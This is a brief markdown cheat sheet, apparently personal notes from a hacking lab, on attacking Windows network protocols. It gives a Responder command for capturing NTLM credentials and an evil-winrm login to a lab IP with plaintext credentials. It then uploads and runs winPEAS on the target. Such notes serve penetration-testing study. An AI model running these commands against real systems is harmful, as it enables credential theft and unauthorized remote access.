# Windows network protocols

## tools

- [responder](https://github.com/lgandx/Responder)
  - `sudo responder -I tun0`
  - [hacktricks - places to steal ntlm creds](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)

## WinRM - 5985,5986 - Windows Remote Management

- [hacktricks WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

- `mv winPEASx64.exe ./executables`
- `evil-winrm -i 10.10.11.106 -P 5985 -u 'tony' -p 'liltony' -s scripts -e executables `

  - `cd \programdata`
  - `upload executables/winPEASx64.exe`
  - `.\winPEASx64.exe`
